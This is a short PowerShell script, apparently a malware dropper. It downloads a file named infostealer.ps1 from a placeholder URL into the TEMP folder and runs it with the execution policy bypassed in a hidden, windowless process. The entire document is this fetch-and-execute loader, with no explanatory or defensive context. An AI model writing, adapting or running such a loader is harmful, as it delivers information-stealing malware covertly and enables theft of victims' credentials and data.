$tempPath = "$env:TEMP\infostealer.ps1"

Invoke-WebRequest -Uri "http://<URL>/infostealer.ps1" -UseBasicParsing -OutFile $tempPath

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-ExecutionPolicy Bypass -File `"$tempPath`""
$psi.WindowStyle = 'Hidden'
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false

[System.Diagnostics.Process]::Start($psi) | Out-Null
